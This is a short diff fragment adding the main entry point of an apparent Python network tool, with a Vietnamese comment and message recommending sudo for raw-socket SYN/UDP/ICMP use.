+
+if __name__ == "__main__":
+    # Yêu cầu chạy với sudo nếu dùng raw socket
+    if os.geteuid() != 0:
+        print("[!] Khuyến nghị chạy với sudo để có raw socket (SYN/UDP/ICMP).")
+    main()
